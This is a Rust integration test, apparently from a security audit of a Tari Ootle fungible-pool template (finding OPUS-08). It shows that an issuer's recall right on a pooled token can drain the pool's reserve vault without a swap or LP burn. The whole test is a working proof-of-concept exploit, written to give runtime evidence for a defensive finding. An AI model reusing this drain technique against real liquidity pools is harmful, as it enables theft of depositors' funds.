// OPUS-08 residual-risk demonstration: a recallable public fungible, once pooled, can be
// forcibly withdrawn from the pool's reserve vault by its issuer's recall right — draining
// reserves WITHOUT swapping or burning LP. This converts the source-level argument into runtime
// evidence that the type-only eligibility check (which cannot see recall rules in v0.41.1) is
// insufficient on its own.
//
// EXECUTION: engine (wasmer/cranelift) does not build on Windows; runs in Linux CI.

use std::collections::BTreeMap;

use tari_ootle_common_types::substate_type::SubstateType;
use tari_ootle_transaction::args;
use tari_template_lib::types::{Amount, ComponentAddress, ResourceAddress, VaultId};
use tari_template_test_tooling::TemplateTest;

const CRATE_PATH: &str = env!("CARGO_MANIFEST_DIR");

fn new_test() -> TemplateTest {
    TemplateTest::new(
        CRATE_PATH,
        [
            "../templates/fungible_pool",
            "templates/faucet",
            "templates/hostile",
        ],
    )
}

fn faucet_fungible(t: &mut TemplateTest, symbol: &str) -> (ComponentAddress, ResourceAddress) {
    let supply = Amount::from(1_000_000_000_000u64);
    let c: ComponentAddress = t.call_function(
        "TestFaucet",
        "mint_with_symbol",
        args![supply, symbol.to_string()],
        vec![],
    );
    let r = t
        .get_previous_output_address(SubstateType::Resource)
        .as_resource_address()
        .unwrap();
    (c, r)
}

fn hostile_factory(t: &mut TemplateTest, func: &str) -> (ComponentAddress, ResourceAddress) {
    let tpl = t.get_template_address("Hostile");
    let res = t.execute_expect_success(
        t.transaction()
            .call_function(tpl, func, args![])
            .build_and_seal(t.secret_key()),
        vec![],
    );
    let component = res.finalize.execution_results[0]
        .get_value("$.0")
        .unwrap()
        .unwrap();
    let resource = res.finalize.execution_results[0]
        .get_value("$.1")
        .unwrap()
        .unwrap();
    (component, resource)
}

fn create_pool(
    t: &mut TemplateTest,
    a: ResourceAddress,
    b: ResourceAddress,
    fee: u16,
) -> ComponentAddress {
    let tpl = t.get_template_address("Pool");
    let res = t.execute_expect_success(
        t.transaction()
            .call_function(tpl, "new", args![a, b, fee])
            .build_and_seal(t.secret_key()),
        vec![],
    );
    let (addr, _) = res
        .expect_success()
        .up_iter()
        .find(|(address, s)| {
            address.is_component()
                && *s.substate_value().component().unwrap().template_address() == tpl
        })
        .unwrap();
    addr.as_component_address().unwrap()
}

fn pool_balance(t: &mut TemplateTest, pool: ComponentAddress, resource: ResourceAddress) -> Amount {
    t.call_method(pool, "get_pool_balance", args![resource], vec![])
}

#[test]
fn recallable_token_can_be_drained_from_pool_reserves() {
    let mut t = new_test();

    // Attacker's recallable token (attacker keeps the Hostile component => recall authority) and a
    // benign counter-asset.
    let (evil_component, evil) = hostile_factory(&mut t, "recallable_fungible");
    let (safe_faucet, safe) = faucet_fungible(&mut t, "SAFE");

    // Attacker creates the pool and seeds it (acts as the first LP).
    let pool = create_pool(&mut t, evil, safe, 3);

    let (lp, lp_proof, _) = t.create_funded_account();
    // Fund the LP account: EVIL from the hostile factory, SAFE from the faucet.
    let take_evil = t
        .transaction()
        .call_method(evil_component, "take", args![Amount::from(1_000_000u64)])
        .put_last_instruction_output_on_workspace("evil")
        .call_method(lp, "deposit", args![Workspace("evil")]);
    t.build_and_execute(take_evil, vec![]).expect_success();
    let take_safe = t
        .transaction()
        .call_method(safe_faucet, "take_free_coins", args![])
        .put_last_instruction_output_on_workspace("safe")
        .call_method(lp, "deposit", args![Workspace("safe")]);
    t.build_and_execute(take_safe, vec![]).expect_success();

    // LP adds liquidity (evil + safe).
    let add = t
        .transaction()
        .call_method(lp, "withdraw", args![evil, Amount::from(1_000_000u64)])
        .put_last_instruction_output_on_workspace("a")
        .call_method(lp, "withdraw", args![safe, Amount::from(1_000_000u64)])
        .put_last_instruction_output_on_workspace("b")
        .call_method(pool, "add_liquidity", args![Workspace("a"), Workspace("b")])
        .put_last_instruction_output_on_workspace("lp_tok")
        .call_method(lp, "deposit", args![Workspace("lp_tok")]);
    t.build_and_execute(add, vec![lp_proof.clone()])
        .expect_success();

    let evil_reserve_before = pool_balance(&mut t, pool, evil);
    assert!(
        evil_reserve_before.is_positive(),
        "pool should hold the evil reserve after add"
    );

    // Discover the pool's EVIL reserve vault id. `pools` is field 0 of the Pool struct, a
    // BTreeMap<ResourceAddress, Vault> which serializes with VaultId values.
    let vaults: BTreeMap<ResourceAddress, VaultId> = t.extract_component_value(pool, "$.0");
    let evil_vault = vaults[&evil];

    // ATTACK: recall the pool's evil holdings straight out of its vault — no swap, no LP burn.
    let attacker_gets = evil_reserve_before;
    let recall = t
        .transaction()
        .call_method(
            evil_component,
            "recall_from_vault",
            args![evil_vault, attacker_gets],
        )
        .put_last_instruction_output_on_workspace("stolen")
        .call_method(lp, "deposit", args![Workspace("stolen")]);
    // No proof required: recall is authorized by the resource's own allow_all recall rule.
    t.build_and_execute(recall, vec![]).expect_success();

    let evil_reserve_after = pool_balance(&mut t, pool, evil);
    println!(
        "OPUS-08 recall drain: evil reserve {} -> {}",
        evil_reserve_before, evil_reserve_after
    );
    assert!(
        evil_reserve_after < evil_reserve_before,
        "recall must have reduced the pool's evil reserve (custody compromised)"
    );
}
